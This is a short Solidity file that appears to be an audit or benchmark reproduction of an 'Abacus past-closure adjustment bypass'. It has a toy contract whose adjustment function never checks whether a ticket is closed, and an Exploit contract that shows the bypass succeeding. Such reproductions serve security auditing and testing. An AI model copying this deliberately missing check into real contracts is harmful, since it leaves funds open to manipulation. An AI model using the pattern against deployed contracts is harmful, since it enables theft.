// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 48701: Abacus past-closure adjustment bypass. Reduced local model preserves the reported state transition.

contract Vulnerable {
    mapping(uint256 => bool) public closed; uint256 public adjustment; function close(uint256 id) external { closed[id] = true; } function adjustTicketInfo(uint256) external { adjustment++; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.close(1); bug.adjustTicketInfo(1); success = bug.adjustment() == 1;
    }
}


